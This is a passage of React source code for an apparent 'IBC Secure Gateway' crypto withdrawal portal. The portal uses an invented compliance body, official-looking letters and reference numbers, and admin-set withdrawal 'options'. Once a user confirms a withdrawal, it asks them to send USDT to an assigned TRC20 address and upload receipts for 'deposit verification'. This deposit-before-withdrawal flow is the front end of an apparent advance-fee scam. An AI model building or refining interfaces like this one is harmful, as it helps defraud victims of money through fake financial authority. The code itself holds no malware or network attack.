                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
                  >
                    <CardHeader className="pb-2">
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-red-900 flex items-center gap-2">
                          {!msg.isRead && <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />}
                          {msg.title}
                        </CardTitle>
                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {/* Processing Messages */}
          {processingMessages.length > 0 && (
            <div className="mb-8">
              <h2 className="text-lg font-bold text-amber-600 flex items-center gap-2 mb-4">
                <Clock className="w-5 h-5" />
                Processing
              </h2>
              <div className="space-y-4">
                {processingMessages.map(msg => (
                  <Card 
                    key={msg.id} 
                    className={`border-2 ${!msg.isRead ? 'border-amber-400 bg-amber-50' : 'border-amber-200'} cursor-pointer hover:shadow-lg transition-all`}
                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
                  >
                    <CardHeader className="pb-2">
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-amber-900 flex items-center gap-2">
                          {!msg.isRead && <div className="w-2 h-2 bg-amber-500 rounded-full" />}
                          {msg.title}
                        </CardTitle>
                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {/* Resolved Messages */}
          {resolvedMessages.length > 0 && (
            <div className="mb-8">
              <h2 className="text-lg font-bold text-green-600 flex items-center gap-2 mb-4">
                <CheckCircle className="w-5 h-5" />
                Resolved
              </h2>
              <div className="space-y-4">
                {resolvedMessages.map(msg => (
                  <Card 
                    key={msg.id} 
                    className="border-2 border-green-200 cursor-pointer hover:shadow-lg transition-all"
                    onClick={() => { setSelectedMessage(msg); if (!msg.isRead) markAdminMessageAsRead(msg.id); }}
                  >
                    <CardHeader className="pb-2">
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-green-900">{msg.title}</CardTitle>
                        <span className="text-xs text-slate-500">{new Date(msg.createdAt).toLocaleDateString()}</span>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-slate-600 line-clamp-2">{msg.body}</p>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </div>
          )}

          {adminMessages.length === 0 && (
            <div className="text-center py-16">
              <MessageCircle className="w-16 h-16 mx-auto text-slate-300 mb-4" />
              <h3 className="text-xl font-semibold text-slate-600">No Messages</h3>
              <p className="text-slate-500">You have no messages from IBC at this time.</p>
            </div>
          )}
        </main>

        {/* Message Detail Dialog */}
        <Dialog open={!!selectedMessage} onOpenChange={() => setSelectedMessage(null)}>
          <DialogContent className="max-w-lg">
            <DialogHeader>
              <DialogTitle className="flex items-center gap-2">
                {selectedMessage?.category === 'urgent' && <AlertTriangle className="w-5 h-5 text-red-500" />}
                {selectedMessage?.category === 'processing' && <Clock className="w-5 h-5 text-amber-500" />}
                {selectedMessage?.category === 'resolved' && <CheckCircle className="w-5 h-5 text-green-500" />}
                {selectedMessage?.title}
              </DialogTitle>
              <DialogDescription>
                {selectedMessage && new Date(selectedMessage.createdAt).toLocaleString()}
              </DialogDescription>
            </DialogHeader>
            <div className="py-4">
              <p className="text-slate-700 whitespace-pre-line">{selectedMessage?.body}</p>
            </div>
            <DialogFooter>
              <Button onClick={() => setSelectedMessage(null)}>Close</Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  // DEPOSIT VIEW
  if (viewState === 'deposit') {
    return (
      <div className="min-h-screen bg-slate-50">
        <nav className="bg-primary text-white shadow-lg">
          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
            <Button variant="ghost" size="icon" className="text-white" onClick={() => setViewState('dashboard')}>
              <ArrowLeft className="w-5 h-5" />
            </Button>
            <div>
              <h1 className="font-bold">Deposit & Receipts</h1>
              <p className="text-xs text-blue-200">Upload and track your deposit receipts</p>
            </div>
          </div>
        </nav>

        <main className="max-w-5xl mx-auto px-4 py-8">
          {/* Deposit Address Info */}
          {currentCase?.depositAddress && (
            <Card className="mb-8 border-2 border-amber-200 bg-amber-50">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-amber-900">
                  <Wallet className="w-5 h-5" />
                  Your USDT Deposit Address (TRC20)
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex items-center gap-2 p-4 bg-white rounded border">
                  <code className="flex-1 text-sm break-all font-mono font-bold text-slate-900">
                    {currentCase.depositAddress}
                  </code>
                  <Button
                    variant="outline"
                    size="sm"
                    className="flex-shrink-0"
                    onClick={() => {
                      navigator.clipboard.writeText(currentCase.depositAddress || '');
                      toast({ title: "Copied!", description: "Deposit address copied to clipboard" });
                    }}
                    data-testid="button-copy-address"
                  >
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>
                <div className="mt-4 p-3 bg-amber-100 rounded-lg">
                  <p className="text-sm text-amber-800 font-medium mb-2">Important Instructions:</p>
                  <ul className="text-xs text-amber-700 space-y-1 list-disc list-inside">
                    <li>Only send USDT on the TRC20 network</li>
                    <li>After completing your deposit, upload the receipt below</li>
                    <li>Keep your transaction hash for reference</li>
                  </ul>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Upload Section */}
          <Card className="mb-8">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Upload className="w-5 h-5" />
                Upload Deposit Receipt
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <Textarea
                  placeholder="Add notes about your deposit (optional)..."
                  value={receiptNotes}
                  onChange={(e) => setReceiptNotes(e.target.value)}
                  className="resize-none"
                  rows={3}
                />
                <input
                  ref={fileInputRef}
                  type="file"
                  accept="image/*"
                  onChange={handleFileUpload}
                  className="hidden"
                />
                <Button 
                  className="w-full" 
                  onClick={() => fileInputRef.current?.click()}
                  disabled={uploadingReceipt}
                >
                  {uploadingReceipt ? (
                    <>Uploading...</>
                  ) : (
                    <>
                      <Image className="w-4 h-4 mr-2" />
                      Select Image to Upload
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>

          {/* Receipt History */}
          <h3 className="text-lg font-bold text-slate-900 mb-4">Uploaded Receipts</h3>
          {depositReceipts.length === 0 ? (
            <div className="text-center py-12 bg-white rounded-lg border">
              <Image className="w-12 h-12 mx-auto text-slate-300 mb-3" />
              <p className="text-slate-500">No receipts uploaded yet</p>
            </div>
          ) : (
            <div className="space-y-4">
              {depositReceipts.map(receipt => (
                <Card key={receipt.id}>
                  <CardContent className="py-4 flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      {receipt.imageData && (
                        <img src={receipt.imageData} alt="Receipt" className="w-16 h-16 object-cover rounded" />
                      )}
                      <div>
                        <p className="font-semibold">{receipt.fileName || 'Receipt'}</p>
                        <p className="text-sm text-slate-500">{new Date(receipt.uploadedAt).toLocaleString()}</p>
                        {receipt.notes && <p className="text-sm text-slate-600 mt-1">{receipt.notes}</p>}
                      </div>
                    </div>
                    <Badge variant={
                      receipt.status === 'approved' ? 'default' :
                      receipt.status === 'rejected' ? 'destructive' :
                      'secondary'
                    }>
                      {receipt.status}
                    </Badge>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}

          {/* Ask Support */}
          <Card className="mt-8">
            <CardContent className="py-6 text-center">
              <p className="text-slate-600 mb-4">Need help with your deposit?</p>
              <Button onClick={() => setIsChatOpen(true)}>
                <MessageCircle className="w-4 h-4 mr-2" />
                Contact IBC Support
              </Button>
            </CardContent>
          </Card>
        </main>
      </div>
    );
  }

  // SUCCESS VIEW - Redirects to deposit address chat
  if (viewState === 'success') {
    const ticketId = lastSubmission?.id ? `IBC-${String(lastSubmission.id).padStart(6, '0')}` : `IBC-${Date.now().toString().slice(-6)}`;
    
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 to-blue-50">
        {/* Header */}
        <nav className="bg-primary text-white shadow-lg">
          <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-4">
            <img src={ibcLogo} alt="IBC" className="h-10 w-10 object-contain" />
            <div>
              <h1 className="font-bold">IBC SECURE GATEWAY</h1>
              <p className="text-xs text-blue-200">Deposit Verification Required</p>
            </div>
          </div>
        </nav>

        <main className="max-w-3xl mx-auto px-4 py-8">
          {/* Success Banner */}
          <motion.div 
            initial={{ opacity: 0, y: -20 }} 
            animate={{ opacity: 1, y: 0 }}
            className="bg-green-50 border-2 border-green-200 rounded-lg p-6 mb-8"
          >
            <div className="flex items-center gap-4">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                <CheckCircle2 className="w-8 h-8 text-green-600" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-green-900">Withdrawal Request Confirmed</h2>
                <p className="text-green-700">Reference: <span className="font-mono font-bold">{ticketId}</span></p>
                <p className="text-sm text-green-600 mt-1">Option {lastSubmission?.selectedOption || selectedOption} selected on {new Date().toLocaleDateString()}</p>
              </div>
            </div>
          </motion.div>

          {/* Deposit Address Section */}
          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
          >
            <Card className="border-2 border-amber-200 bg-amber-50 mb-6">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-amber-900">
                  <Wallet className="w-5 h-5" />
                  USDT Deposit Address
                </CardTitle>
              </CardHeader>
              <CardContent>
                {currentCase?.depositAddress ? (
                  <>
                    <div className="bg-white p-4 rounded-lg border-2 border-dashed border-amber-300 mb-4">
                      <p className="text-xs text-slate-500 uppercase tracking-wider mb-2">Your Assigned Deposit Address (TRC20)</p>
                      <div className="flex items-center gap-3">
                        <code className="flex-1 text-lg font-mono font-bold text-slate-900 break-all">
                          {currentCase.depositAddress}
                        </code>
                        <Button
                          variant="outline"
                          size="sm"
                          className="flex-shrink-0 border-amber-400 hover:bg-amber-100"
                          onClick={() => {
                            navigator.clipboard.writeText(currentCase.depositAddress || '');
                            toast({ title: "Copied!", description: "Deposit address copied to clipboard" });
                          }}
                          data-testid="button-copy-deposit-address"
                        >
                          <Copy className="w-4 h-4 mr-1" />
                          Copy
                        </Button>
                      </div>
                    </div>
                    <div className="bg-amber-100 p-4 rounded-lg">
                      <p className="text-amber-900 font-semibold mb-2">Important Instructions:</p>
                      <ul className="text-sm text-amber-800 space-y-1 list-disc list-inside">
                        <li>Transfer the required amount to the address above</li>
                        <li>Only send USDT (TRC20 network)</li>
                        <li>Keep your transaction receipt for verification</li>
                        <li>Contact support after completing the deposit</li>
                      </ul>
                    </div>
                  </>
                ) : (
                  <div className="text-center py-8">
                    <AlertTriangle className="w-12 h-12 mx-auto text-amber-500 mb-4" />
                    <p className="text-amber-900 font-semibold">Deposit Address Pending</p>
                    <p className="text-amber-700 text-sm mt-2">Please contact support to receive your deposit address.</p>
                  </div>
                )}
              </CardContent>
            </Card>
          </motion.div>

          {/* Chat Section */}
          <motion.div 
            initial={{ opacity: 0, y: 20 }} 
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
          >
            <Card className="border-2 border-blue-200">
              <CardHeader className="bg-blue-50">
                <CardTitle className="flex items-center gap-2 text-blue-900">
                  <MessageCircle className="w-5 h-5" />
                  Deposit Verification Support
                </CardTitle>
              </CardHeader>
              <CardContent className="p-0">
                {/* Embedded Chat */}
                <div className="h-64 overflow-y-auto p-4 space-y-3 bg-slate-50">
                  {chatMessages.length === 0 ? (
                    <div className="text-center text-slate-500 mt-8">
                      <MessageCircle className="h-12 w-12 mx-auto text-slate-300 mb-3" />
                      <p className="text-sm">Start a conversation about your deposit.</p>
                      <p className="text-xs text-slate-400 mt-1">Our team will verify your transaction.</p>
                    </div>
                  ) : (
                    chatMessages.map((msg) => (
                      <div
                        key={msg.id}
                        className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
                      >
                        <div
                          className={`max-w-[80%] px-4 py-2 rounded-2xl ${
                            msg.sender === 'user'
                              ? 'bg-blue-600 text-white rounded-br-md'
                              : 'bg-white text-slate-800 border border-slate-200 rounded-bl-md'
                          }`}
                        >
                          <p className="text-sm whitespace-pre-wrap">{msg.message}</p>
                          <p className={`text-xs mt-1 ${msg.sender === 'user' ? 'text-blue-100' : 'text-slate-400'}`}>
                            {new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                          </p>
                        </div>
                      </div>
                    ))
                  )}
                </div>
                <div className="p-3 border-t border-slate-200 bg-white">
                  <div className="flex gap-2">
                    <Input
                      placeholder="Ask about your deposit..."
                      value={newMessage}
                      onChange={(e) => setNewMessage(e.target.value)}
                      onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendMessage()}
                      disabled={isSendingMessage}
                      className="flex-1"
                      data-testid="input-deposit-chat"
                    />
                    <Button
                      onClick={sendMessage}
                      disabled={!newMessage.trim() || isSendingMessage}
                      size="sm"
                      className="bg-blue-600 hover:bg-blue-700"
                      data-testid="button-send-deposit-chat"
                    >
                      <Send className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>
          </motion.div>

          {/* Navigation */}
          <div className="mt-8 flex gap-4">
            <Button 
              variant="outline" 
              className="flex-1"
              onClick={() => setViewState('dashboard')}
            >
              <Home className="w-4 h-4 mr-2" />
              Back to Dashboard
            </Button>
            <Button 
              className="flex-1"
              onClick={() => setViewState('deposit')}
            >
              <Upload className="w-4 h-4 mr-2" />
              Upload Receipt
            </Button>
          </div>
        </main>
      </div>
    );
  }

  // SUBMISSIONS FOLDER VIEW
  if (viewState === 'submissions') {
    return (
      <div className="min-h-screen bg-slate-900 p-4 font-sans">
        <div className="max-w-3xl mx-auto">
          <div className="flex items-center gap-3 mb-8">
            <img src={ibcLogo} alt="IBC Logo" className="h-10 w-10 object-contain opacity-80" />
            <div>
              <h1 className="text-xl font-bold text-white">Document Archive</h1>
              <p className="text-slate-400 text-xs">Your submission history</p>
            </div>
          </div>

          <Card className="bg-slate-950 border-slate-800 mb-6">
            <CardHeader className="border-b border-slate-800">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <FolderOpen className="w-5 h-5 text-blue-500" />
                  <CardTitle className="text-white text-lg">Your Submissions</CardTitle>
                </div>
                <Badge variant="outline" className="text-slate-400 border-slate-700">
                  {submissions.length} records
                </Badge>
              </div>
            </CardHeader>
            <CardContent className="pt-6">
              {submissions.length === 0 ? (
                <div className="text-center py-12 text-slate-500">
                  <FileText className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p>No submissions found.</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {submissions.map((s) => (
                    <div key={s.id} className="bg-slate-900 border border-slate-800 rounded-lg p-4" data-testid={`submission-${s.id}`}>
                      <div className="flex justify-between items-start mb-3">
                        <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                          Option {s.selectedOption} Selected
                        </Badge>
                        <span className="text-xs text-slate-500">
                          {new Date(s.submittedAt).toLocaleString()}
                        </span>
                      </div>
                      <div className="grid grid-cols-2 gap-4 text-sm">
                        <div>
                          <span className="text-slate-500 block text-xs mb-1">Withdrawal Amount</span>
                          <span className="text-green-400 font-medium">{s.withdrawalAmount}</span>
                        </div>
                        <div>
                          <span className="text-slate-500 block text-xs mb-1">Total Batches</span>
                          <span className="text-slate-300">{s.withdrawalBatches}</span>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>

          <Button variant="outline" className="border-slate-700 text-slate-300" onClick={() => setViewState('dashboard')} data-testid="button-back-dashboard">
            <ArrowLeft className="w-4 h-4 mr-2" /> Back to Dashboard
          </Button>
        </div>
      </div>
    );
  }

  // LETTER VIEW
  const adminData = currentCase ? {
    vipStatus: currentCase.vipStatus,
    username: currentCase.username,
    withdrawalAmount: currentCase.withdrawalAmount,
    withdrawalBatches: currentCase.withdrawalBatches,
    physilocal0: currentCase.physilocal0
  } : undefined;

  const letter = letterContent || {
    headline: "Withdrawal Protocol Selection",
    introduction: `We acknowledge the successful completion of your re-authentication procedure.`,
    bodyContent: `In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account.`,
    footerNote: "NEXT ACTION REQUIRED: Please confirm your preferred withdrawal option below.",
    optionATitle: "Accelerated Release",
    optionADescription: "Full withdrawal amount processed in accelerated batches.",
    optionBTitle: "Standard Release",
    optionBDescription: "Half allocation processed in standard batches."
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-blue-100">
      {/* Navigation */}
      <nav className="bg-white border-b border-slate-200 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16">
            <div className="flex items-center gap-3">
              <img src={ibcLogo} alt="IBC Logo" className="h-8 w-8 object-contain" />
              <div className="hidden md:block">
                <div className="text-sm font-bold text-primary leading-none">IBC SECURE GATEWAY</div>
                <div className="text-[10px] text-slate-500 font-medium tracking-wider uppercase">Account Integrity Division</div>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Button 
                variant="ghost" 
                size="sm" 
                onClick={() => setViewState('dashboard')}
                data-testid="button-back-dashboard"
              >
                <ArrowLeft className="w-4 h-4 mr-2" /> Dashboard
              </Button>
              {submissions.length > 0 && (
                <Button 
                  variant="outline" 
                  size="sm" 
                  className="border-slate-300"
                  onClick={() => setViewState('submissions')}
                  data-testid="button-view-history"
                >
                  <History className="w-4 h-4 mr-2" /> View History ({submissions.length})
                </Button>
              )}
              <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full text-xs font-medium border border-green-100">
                <ShieldCheck className="w-3 h-3" />
                <span>Verified: {adminData?.vipStatus || "Standard"}</span>
              </div>
              <div className="flex items-center gap-2 text-xs text-slate-500">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                Connected
              </div>
            </div>
          </div>
        </div>
      </nav>

      <main className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
          {/* Header */}
          <div className="mb-10 text-center md:text-left">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wide mb-4 border border-blue-100">
              <Lock className="w-3 h-3" /> Action Required
            </div>
            <h1 className="text-3xl md:text-4xl font-serif font-bold text-slate-900 mb-2">
              {letter.headline}
            </h1>
            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-{currentCase?.accessCode}</p>
          </div>

          {/* Letter Content */}
          <div className="bg-white rounded-lg border border-slate-200 p-8 md:p-10 shadow-sm mb-10 relative overflow-hidden">
            <div className="absolute top-[-20%] right-[-10%] w-[50%] h-[150%] opacity-[0.03] pointer-events-none">
              <img src={ibcLogo} alt="" className="w-full h-full object-contain" />
            </div>
            <div className="relative z-10 max-w-3xl">
              <div className="mb-6 pb-6 border-b border-slate-100">
                 <h2 className="text-lg font-bold text-primary font-serif mb-1">INTERNATIONAL BLOCKCHAIN COMMUNITY (IBC)</h2>
                 <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Account Integrity & Security Operations Division (ISO-D)</p>
                 <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Global Compliance Secretariat</p>
              </div>
              <div className="prose prose-slate text-slate-700 max-w-none text-sm leading-relaxed">
                <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear {currentCase?.userName || "Client"},</p>
                {letter.introduction && (
                  <p className="mb-4 whitespace-pre-line">{letter.introduction.replace(/^Dear\s+[^,]+,?\s*/i, '')}</p>
                )}
                {letter.bodyContent && (
                  <p className="mb-4 whitespace-pre-line">{letter.bodyContent}</p>
                )}
                {letter.footerNote && (
                  <p className="mb-4"><strong>{letter.footerNote}</strong></p>
                )}
              </div>
            </div>
          </div>

          {/* Already Submitted Notice */}
          {submissions.length > 0 ? (
            <motion.div 
              initial={{ opacity: 0, y: 20 }} 
              animate={{ opacity: 1, y: 0 }}
              className="bg-green-50 border-2 border-green-200 rounded-lg p-8 mb-10"
            >
              <div className="flex items-start gap-4">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                  <CheckCircle2 className="w-8 h-8 text-green-600" />
                </div>
                <div className="flex-1">
                  <h3 className="text-xl font-bold text-green-900 mb-2">Withdrawal Selection Confirmed</h3>
                  <p className="text-green-700 mb-4">Your withdrawal option has already been submitted and is being processed.</p>
                  
                  <div className="bg-white rounded-lg p-4 border border-green-200 space-y-2">
                    <div className="flex justify-between text-sm">
                      <span className="text-slate-600">Reference Number</span>
                      <span className="font-mono font-bold text-primary">IBC-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-slate-600">Selected Option</span>
                      <Badge className={submissions[0]?.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                        Option {submissions[0]?.selectedOption}
                      </Badge>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-slate-600">Submitted On</span>
                      <span className="font-medium">{new Date(submissions[0]?.submittedAt || Date.now()).toLocaleDateString()}</span>
                    </div>
                  </div>
                  
                  <div className="mt-6 flex gap-3">
                    <Button onClick={() => setViewState('success')} className="bg-green-600 hover:bg-green-700">
                      <Wallet className="w-4 h-4 mr-2" />
                      View Deposit Instructions
                    </Button>
                    <Button variant="outline" onClick={() => setViewState('submissions')}>
                      <History className="w-4 h-4 mr-2" />
                      View History
                    </Button>
                  </div>
                </div>
              </div>
            </motion.div>
          ) : (
            <>
              {/* Options */}
              <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
                <div className="w-8 h-[1px] bg-slate-300"></div>
                Select Withdrawal Option
                <div className="w-full h-[1px] bg-slate-300"></div>
              </h3>
              
              <div className="grid md:grid-cols-2 gap-8 mb-12">
            {/* Option A */}
            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`} onClick={() => handleSelect('A')} data-testid="card-option-a">
                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="text-xs font-bold text-primary uppercase tracking-wider mb-1">Option A – Accelerated</div>
                      <CardTitle className="text-2xl font-bold text-slate-900">{letter.optionATitle}</CardTitle>
                    </div>
                    <div className="h-10 w-10 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">A</div>
                  </div>
                </CardHeader>
                <CardContent className="pt-6 space-y-4">
                  {letter.optionADescription && (
                    <p className="text-sm text-slate-600">{letter.optionADescription}</p>
                  )}
                  <div className="flex justify-between items-baseline">
                    <span className="text-2xl font-bold text-primary">{letterContent?.optionAAmount || adminData?.withdrawalAmount}</span>
                  </div>
                  <div className="space-y-3 pt-2">
                    {letterContent?.optionABatches ? (
                      <div className="text-sm text-slate-600 whitespace-pre-line">{letterContent.optionABatches}</div>
                    ) : (
                      <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                        <span className="text-slate-600">Total Batches</span>
                        <span className="font-semibold text-slate-900">{adminData?.withdrawalBatches} Transfers</span>
                      </div>
                    )}
                    {letterContent?.optionATotalAmount && (
                      <div className="flex justify-between text-sm py-2 border-b border-slate-100 font-semibold">
                        <span className="text-slate-600">Total Withdrawal</span>
                        <span className="text-slate-900">{letterContent.optionATotalAmount}</span>
                      </div>
                    )}
                    <div className="flex justify-between text-sm py-2 bg-blue-50 px-3 rounded text-blue-900">
                      <span className="font-semibold">Withdrawal ID</span>
                      <span className="font-bold">{letterContent?.optionAFilelocoId || adminData?.physilocal0}</span>
                    </div>
                  </div>
                </CardContent>
                <CardFooter className="pt-2 pb-6">
                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'} data-testid="button-select-a">Select Option A</Button>
                </CardFooter>
              </Card>
            </motion.div>

            {/* Option B */}
            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`} onClick={() => handleSelect('B')} data-testid="card-option-b">
                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Option B – Standard</div>
                      <CardTitle className="text-2xl font-bold text-slate-900">{letter.optionBTitle}</CardTitle>
                    </div>
                    <div className="h-10 w-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 font-bold">B</div>
                  </div>
                </CardHeader>
                <CardContent className="pt-6 space-y-4">
                  {letter.optionBDescription && (
                    <p className="text-sm text-slate-600">{letter.optionBDescription}</p>
                  )}
                  <div className="flex justify-between items-baseline">
                    <span className="text-2xl font-bold text-slate-700">{letterContent?.optionBAmount || `Half (${parseInt(adminData?.withdrawalAmount || "0") / 2})`}</span>
                  </div>
                  <div className="space-y-3 pt-2">
                    {letterContent?.optionBBatches ? (
                      <div className="text-sm text-slate-600 whitespace-pre-line">{letterContent.optionBBatches}</div>
                    ) : (
                      <div className="flex justify-between text-sm py-2 border-b border-slate-100">
                        <span className="text-slate-600">Total Batches</span>
                        <span className="font-semibold text-slate-900">{parseInt(adminData?.withdrawalBatches || "0") * 2} Transfers</span>
                      </div>
                    )}
                    {letterContent?.optionBTotalAmount && (
                      <div className="flex justify-between text-sm py-2 border-b border-slate-100 font-semibold">
                        <span className="text-slate-600">Total Withdrawal</span>
                        <span className="text-slate-900">{letterContent.optionBTotalAmount}</span>
                      </div>
                    )}
                    <div className="flex justify-between text-sm py-2 bg-slate-100 px-3 rounded text-slate-900">
                      <span className="font-semibold">Withdrawal ID</span>
                      <span className="font-bold">{letterContent?.optionBFilelocoId || adminData?.physilocal0}</span>
                    </div>
                  </div>
                </CardContent>
                <CardFooter className="pt-2 pb-6">
                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'} data-testid="button-select-b">Select Option B</Button>
                </CardFooter>
              </Card>
            </motion.div>
              </div>
            </>
          )}
        </motion.div>
      </main>

      {/* Confirmation Dialog */}
      <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
            <DialogDescription>
              You are about to initiate the withdrawal schedule for {adminData?.username}.
            </DialogDescription>
          </DialogHeader>
          <div className="py-4">
            <div className="bg-slate-50 rounded-lg p-4 space-y-2">
              <div className="flex justify-between">
                <span className="text-slate-500">Selected Option</span>
                <Badge className={selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>Option {selectedOption}</Badge>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">Amount</span>
                <span className="font-medium">{adminData?.withdrawalAmount}</span>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
            <Button onClick={handleSubmit} disabled={isSubmitting} className="gap-2" data-testid="button-confirm-submit">
              {isSubmitting ? "Transmitting..." : "Submit Selection"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Floating Chat Button */}
      {currentCase && (
        <motion.div
          className="fixed bottom-6 right-6 z-50"
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: "spring", stiffness: 260, damping: 20 }}
        >
          <Button
            onClick={() => setIsChatOpen(true)}
            className="h-14 w-14 rounded-full shadow-lg bg-blue-600 hover:bg-blue-700 relative"
            data-testid="button-open-chat"
          >
            <MessageCircle className="h-6 w-6" />
            {unreadCount > 0 && (
              <span className="absolute -top-1 -right-1 h-5 w-5 rounded-full bg-red-500 text-xs text-white flex items-center justify-center font-bold animate-pulse">
                {unreadCount}
              </span>
            )}
          </Button>
        </motion.div>
      )}

      {/* Chat Box */}
      <AnimatePresence>
        {isChatOpen && currentCase && (
          <motion.div
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="fixed bottom-6 right-6 z-50 w-80 sm:w-96 h-[500px] bg-white rounded-lg shadow-2xl border border-slate-200 flex flex-col overflow-hidden"
            data-testid="chat-panel"
          >
            <div className="bg-blue-600 text-white px-4 py-3 flex justify-between items-center">
              <div className="flex items-center gap-2">
                <MessageCircle className="h-5 w-5" />
                <span className="font-semibold">IBC Support</span>
              </div>
              <Button
                variant="ghost"
                size="sm"
                className="h-8 w-8 p-0 text-white hover:bg-blue-700"
                onClick={() => setIsChatOpen(false)}
                data-testid="button-close-chat"
              >
                <X className="h-4 w-4" />
              </Button>
            </div>
            
            <div ref={chatScrollRef} className="flex-1 overflow-y-auto p-4 space-y-3 bg-slate-50">
              {chatMessages.length === 0 ? (
                <div className="text-center text-slate-500 mt-8">
                  <MessageCircle className="h-12 w-12 mx-auto text-slate-300 mb-3" />
                  <p className="text-sm">No messages yet. Start a conversation with support.</p>
                </div>
              ) : (
                chatMessages.map((msg) => (
                  <div
